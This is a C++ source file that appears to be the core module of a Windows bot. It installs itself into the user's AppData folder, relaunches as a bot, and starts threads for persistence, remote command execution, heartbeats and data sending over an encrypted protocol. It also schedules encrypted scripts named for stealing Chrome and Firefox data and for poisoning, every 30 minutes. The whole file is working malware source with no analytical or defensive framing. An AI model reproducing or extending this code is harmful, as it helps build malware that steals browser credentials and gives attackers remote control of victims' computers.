#include "stdafx.h"
#include "kernel.h"

#include "winsecurity.h"
#include "filesystem.h"
#include "cryptedstrings.h"
#include "cryptedscripts.h"

#include "persistencemodule.h"
#include "installmodule.h"
#include "scriptmodule.h"
#include "commandmodule.h"
#include "infodatabase.h"
#include "bzprotocol.h"
#include "threadsgroup.h"
#include "sync.h"
#include "defines.h"

kernel_data_t kernelData;
ThreadsGroup::GROUP servcieThreads;

static bool __inline initOsBasic()
{
	if ((kernelData.securityAttributes.buf = WinSecurity::_getFullAccessDescriptors(&kernelData.securityAttributes.saAllowAll, &kernelData.securityAttributes.sdAllowAll)) == NULL)
	{
		WDEBUG0(WDDT_ERROR, "GetFullAccessDescriptors failed.");
		return false;
	}
	return true;
}

static bool __inline initEvents()
{
	kernelData.globalEvents.stopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);

	if (kernelData.globalEvents.stopEvent == NULL)
	{
		WDEBUG0(WDDT_ERROR, "Can't create global events.");
		return false;
	}
	return true;
}

static bool __inline initPaths()
{
	if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, kernelData.paths.home) != S_OK)
	{
		WDEBUG0(WDDT_ERROR, "Failed to get home path.");
		return false;
	}
	PathRemoveBackslashW(kernelData.paths.home);

	GetModuleFileNameW(NULL, kernelData.paths.process, MAX_PATH);

	return true;
}

static bool __inline initDatabase()
{
	CSTRW(databaseFile, path_infodatabase);
	if (!InfoDatabase::loadDatabase(kernelData.paths.home, databaseFile, &kernelData.database))
	{
		if (!InfoDatabase::createDefaultDatabase(kernelData.paths.home, databaseFile, &kernelData.database)
			|| !InfoDatabase::_saveDatabaseHeader(&kernelData.database))
		{
			return false;
		}
	}
	return true;
}

static bool __inline initCrypt()
{
	CSTRW(bzpValidatePublicKeyString, bz_protocol_validate_public_key);
	CSTRW(bzpDataPublicKeyString, bz_protocol_data_public_key);

	BYTE publicKey[1024];
	DWORD publicKeyLength;
	if (!CryptStringToBinary(bzpValidatePublicKeyString, 0, CRYPT_STRING_BASE64HEADER, publicKey, &publicKeyLength, NULL, NULL)) return false;

	CERT_PUBLIC_KEY_INFO * publicKeyInfo;
	DWORD publicKeyInfoLen;
	if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, publicKey, publicKeyLength, CRYPT_ENCODE_ALLOC_FLAG, NULL, &publicKeyInfo, &publicKeyInfoLen)) return false;

	HCRYPTPROV hProv = 0;
	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (GetLastError() == NTE_BAD_KEYSET)
		{
			if (!CryptAcquireContext(&hProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, CRYPT_NEWKEYSET)) return false;
		}
	}

	if (!CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, publicKeyInfo, &kernelData.keys.bzpValidatePublicKey)) return false;

	LocalFree(publicKeyInfo);

	hProv = 0;

	if (!CryptStringToBinary(bzpDataPublicKeyString, 0, CRYPT_STRING_BASE64HEADER, publicKey, &publicKeyLength, NULL, NULL)) return false;

	if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, publicKey, publicKeyLength, CRYPT_ENCODE_ALLOC_FLAG, NULL, &publicKeyInfo, &publicKeyInfoLen)) return false;
	
	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (GetLastError() == NTE_BAD_KEYSET)
		{
			if (!CryptAcquireContext(&hProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, CRYPT_NEWKEYSET)) return false;
		}
	}

	if (!CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING, publicKeyInfo, &kernelData.keys.bzpDataPublicKey)) return false;

	LocalFree(publicKeyInfo);

	return true;
}

static void runServices()
{
	ThreadsGroup::_createGroup(&servcieThreads);
	ThreadsGroup::_createThread(&servcieThreads, 0, BzProtocol::_procSender, NULL, NULL, NULL);
	ThreadsGroup::_createThread(&servcieThreads, 0, BzProtocol::_procHeartbeat, NULL, NULL, NULL);
	ThreadsGroup::_createThread(&servcieThreads, 0, PersistenceModule::_procAutorun, NULL, NULL, NULL);
	ThreadsGroup::_createThread(&servcieThreads, 0, CommandModule::_procExecuteCommands, NULL, NULL, NULL);
	ThreadsGroup::_waitForAllExit(&servcieThreads, INFINITE);
	ThreadsGroup::_closeGroup(&servcieThreads);
}

static void registerScripts()
{
	ScriptModule::registerCronScript(CryptedScripts::id_steal_chrome, TIME_MINUTE * 30, CryptedScripts::len_steal_chrome, false);
	ScriptModule::registerCronScript(CryptedScripts::id_steal_firefox, TIME_MINUTE * 30, CryptedScripts::len_steal_firefox, false);
	ScriptModule::registerCronScript(CryptedScripts::id_poison_d2, TIME_MINUTE * 30, CryptedScripts::len_poison_d2, false);
}

bool Kernel::init()
{
	if (!initOsBasic()) return false;

	if (!initEvents()) return false;

	if (!initPaths()) return false;

	if (!initDatabase()) return false;

	if (!initCrypt()) return false;

	CSTRW(coreFile, path_core);

	WCHAR corePath[MAX_PATH];
	FileSystem::combinePath(corePath, kernelData.paths.home, coreFile);

	WDEBUG0(WDDT_INFO, "Paths : " << corePath << L" against " << kernelData.paths.process);

#if !_DEBUG
	if (_wcsicmp(kernelData.paths.process, corePath))
	{
		WDEBUG0(WDDT_INFO, "I am an installer");
		InstallModule::installBot(coreFile);
		CSTRW(shellOpen, windows_shellexec_open);
		ShellExecute(NULL, shellOpen, corePath, NULL, NULL, SW_SHOWDEFAULT);
	}
	else
	{
#else
	{
#endif
		WDEBUG0(WDDT_INFO, "I am a bot");
		PersistenceModule::init();
		ScriptModule::init();
		CommandModule::init();
		registerScripts();
		
#if _DEBUG
		WDEBUG("" << std::endl << std::endl << std::endl << "Database dump : ");
		InfoDatabase::info_database_item_cursor_t cursor;
		if (InfoDatabase::firstItem(&kernelData.database, &cursor))
		{
			InfoDatabase::openItem(&kernelData.database, &cursor);
			WDEBUG("Type : " << cursor.currentItemHeader.type << L"Data : " << cursor.itemData);
			InfoDatabase::closeItem(&cursor);
			while (InfoDatabase::nextItem(&kernelData.database, &cursor))
			{
				InfoDatabase::openItem(&kernelData.database, &cursor);
				WDEBUG("Type : " << cursor.currentItemHeader.type << L"Data : " << cursor.itemData);
				InfoDatabase::closeItem(&cursor);
			}
		}
#endif
		runServices();
	}
	return true;
}

void Kernel::uninit()
{
	
}

HANDLE Kernel::waitForMutexOfObject(DWORD id)
{
	WCHAR strObject[50];
	Sync::getObjectName(id, strObject);
	return  Sync::_waitForMutex(&kernelData.securityAttributes.saAllowAll, strObject);
}

bool Kernel::isAlive()
{
	return WaitForSingleObject(kernelData.globalEvents.stopEvent, 0) == WAIT_OBJECT_0 ? false : true;
}